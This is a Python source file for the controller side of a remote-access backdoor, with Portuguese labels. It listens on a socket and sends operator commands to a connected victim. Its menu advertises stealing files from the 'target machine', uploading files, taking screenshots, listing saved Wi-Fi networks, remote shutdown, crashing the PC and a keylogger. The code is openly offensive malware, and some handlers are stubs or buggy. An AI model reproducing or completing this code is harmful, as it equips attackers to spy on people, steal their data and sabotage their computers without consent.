import socket 
import os
def screenshotRecv(): 

   with open('screenshot.png' ,'wb') as file:
        file_data = target.recv(10000)
        file.write(file_data)
   


def shell():
    while True:
        command = f'{input("Zangetsu: ")}'
       
        target.send(command.encode("UTF-8"))
        if command == "Q":
            break
        

        elif command[:2] == "cd" and len(command) > 1:
            continue
        
        elif command[:4] == "help":
            print('''
            |FUNÇÕES DO BACKDOOR|
---------------------------------------------------
|cd       --> Acessa a pasta 
|clear    --> Limpa o terminal
|download --> Baixa arquivos da máquina alvo 
|upload   --> Envia arquivos para máquina alvo 
|src      --> Tira um print da tela da máquina alvo 
|show_wifi --> Mostra as redes que já foram conectadas
|night    --> Desliga o Computador da máquina alvo
|crash_pc --> Abre vários programas até travar
|Keyloger --> Ativa o Keyloger
|check    --> serve para vê se você têm privilégio de ADM
|-------------------------------------------------------''')
        
        elif command[:5] == "clear":
            os.system('clear||cls')


        elif command[:8] == "download":
          try:
                with open(command[9:] ,'wb') as file:
                    file_data = target.recv(10000) 
                    file.write(file_data)
          except:
                
                print("Falha em baixar")
                continue
                


        elif command[:6] == "upload":
            try:
                with open(command[7:] ,'rb' ) as file:
                    s.send(file.read()) 

            except:
                failed = "Failed to upload"
                print(failed)
                continue
                  
                
        elif command[:3] == "scr":
            os.system("clear||cls") 
            screenshotRecv()
            os.system("clear||cls")
            

            
        elif command[:5] == "night": 
             continue


        elif command[:8] == "crash_pc":
             continue


        elif command[:5] == "check":
            continue

        elif command[:12] == "keylog_start":
            continue 

        else:

             result = target.recv(1024)
             print(result.decode("ISO-8859-1"))
         



def server():

    global target 
    global s 

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("127.0.0.1" , 8081))

    s.listen(5) 
 
    print('[+] Servidor Criado ') 
    print('[+] Servidor listando...')


    target,ip = s.accept()

    print(f'Conexão estabilizada a partir de: {str(ip)}') 


server()
shell()
s.close()



